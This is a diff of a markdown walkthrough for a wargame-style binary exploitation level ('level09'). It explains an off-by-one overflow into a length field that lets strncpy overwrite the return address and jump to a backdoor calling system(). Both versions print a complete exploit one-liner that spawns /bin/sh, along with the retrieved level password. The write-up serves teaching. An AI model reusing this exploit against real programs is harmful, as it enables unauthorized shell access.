@@ -1,73 +1,58 @@
-Level09 Walkthrough - Complete Explanation
-Overview
-This level exploits a buffer overflow vulnerability by manipulating a length field to overflow the return address and jump to secret_backdoor function.
-Vulnerability Analysis
-1. Program Structure
-The program has a struct allocated on the stack in handle_msg:
-Offset 0x00-0x8b (0-139):   Message buffer (140 bytes)
-Offset 0x8c-0xb3 (140-179): Username buffer (40 bytes)
-Offset 0xb4-0xb7 (180-183): Length field (4 bytes integer)
-2. The Vulnerability Chain
-In set_username:
+## Level09
 
-Reads up to 128 bytes from stdin using fgets
-Copies characters one-by-one from local buffer to struct+0x8c
-Loop condition: for(i=0; i<=0x28 && buffer[i]!=0; i++)
-Bug: Loop goes from 0 to 40 inclusive, copying 41 bytes instead of 40
-This allows 1 byte overflow into the length field at offset 0xb4!
+## Binary Analysis
 
-In set_msg:
+`level09` contains a structured layout on the stack. A message buffer and a username buffer are part of a stack-allocated struct; an off-by-one write into the username buffer allows control of a length field, which is later used by `strncpy()` to copy user-controlled data into the message buffer. This combination leads to a powerful overflow that can overwrite the return address.
 
-Reads up to 1024 bytes into local buffer
-Uses strncpy(struct+0x0, local_buffer, struct->len) where len is at offset 0xb4
-Bug: If we control the length field, we can make strncpy copy more than 140 bytes
-This overflows the message buffer and overwrites the return address!
+Structure (offsets):
 
-3. Exploitation Steps
-Step 1: Overflow the length field
+- Message buffer: offset `0x00` - `0x8b` (140 bytes)
+- Username buffer: offset `0x8c` - `0xb3` (40 bytes)
+- Length field: offset `0xb4` - `0xb7` (4 bytes)
 
-Send exactly 40 bytes + \xff character
-The 41st byte (\xff = 255) overwrites the first byte of the length field
-This makes the length huge (0x000000ff = 255 or larger depending on existing bytes)
+## Vulnerability Chain
 
-Step 2: Overflow the return address
+1. `set_username` reads up to 128 bytes and copies into the username buffer with a loop `for (i = 0; i <= 0x28 && buffer[i] != 0; i++)` — the `<=` makes it copy 41 bytes instead of 40, so the 41st byte overflows into the first byte of the length field.
+2. `set_msg` then reads up to 1024 bytes into a local buffer and calls `strncpy(struct+0x0, local_buffer, struct->len)`, where `struct->len` is the corrupted length field. If `len` is large, `strncpy` will copy far beyond the message buffer and can overwrite saved frame data, including the return address.
 
-The message buffer is at rbp-0xc0
-Return address is at rbp+0x8
-Offset = 0xc0 + 0x8 = 200 bytes
-Send 200 'A's + address of secret_backdoor
+## Exploitation Steps
 
-Step 3: Jump to secret_backdoor
+1. Overflow the length field by sending exactly 40 bytes for username followed by `\xff` (the 41st byte):
 
-secret_backdoor is at 0x88c (relative address)
-With PIE enabled, base address is 0x555555554000
-Full address: 0x555555554000 + 0x88c = 0x55555555488c
-Little-endian format: \x8c\x48\x55\x55\x55\x55\x00\x00
+```bash
+python -c "print 'A' * 40 + '\xff'" | ./level09
+```
 
-Step 4: Execute shell command
+This sets the low byte of the length field to `0xff` (255), making `len` large.
 
-secret_backdoor calls fgets() then system() with our input
-We provide /bin/sh as input to get a shell
+2. Overflow the return address by supplying a message that is larger than 140 bytes. Based on the stack layout, the offset from the message buffer to the saved return address is 200 bytes (0xc0 + 8). Send `200` padding bytes followed by the target address (little-endian):
 
-The Exploit
-bash(python -c "print 'A' * 40 + '\xff' + '\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh'"; cat) | ./level09
-Breakdown:
+```bash
+# Example: replace <TARGET_ADDR_BYTES> with the little-endian address of secret_backdoor
+python -c "print 'A' * 200 + '<TARGET_ADDR_BYTES>'" | ./level09
+```
 
-'A' * 40 + '\xff' → Username (40 bytes + 1 byte overflow into length)
-'\n' → Newline to submit username
-'A' * 200 → Padding to reach return address
-'\x8c\x48\x55\x55\x55\x55\x00\x00' → Address of secret_backdoor
-'\n' → Newline to submit message
-'/bin/sh' → Command for secret_backdoor to execute
-cat → Keep stdin open for shell interaction
+3. The `secret_backdoor` function reads a line and calls `system()` on it. After redirecting execution there, send `/bin/sh` to spawn a shell.
 
-Getting the Password
-Once you have the shell:
-bashcat /home/users/end/.pass
-Password: j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
-Key Takeaways
+Full exploit (conceptual):
 
-Off-by-one errors (loop condition i<=40 instead of i<40) can lead to exploits
-Integer overflow of length fields can cause massive buffer overflows
-PIE (Position Independent Executable) changes addresses, but they're predictable
-Always validate buffer sizes and use safe string functions
+```bash
+(python -c "print 'A'*40 + '\xff' + '\n' + 'A'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh'"; cat) | ./level09
+```
+
+Note: With PIE enabled the base address will vary — compute the full address by adding the module base to the `secret_backdoor` offset.
+
+## Key Takeaways
+
+- Off-by-one errors can be as dangerous as larger overflows.
+- Corrupting length fields changes the behavior of otherwise-bounded copies (e.g., `strncpy`).
+- PIE changes absolute addresses; compute them at runtime before crafting payloads.
+
+## Result
+
+After exploitation, retrieve the password:
+
+```bash
+cat /home/users/end/.pass
+# j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+```
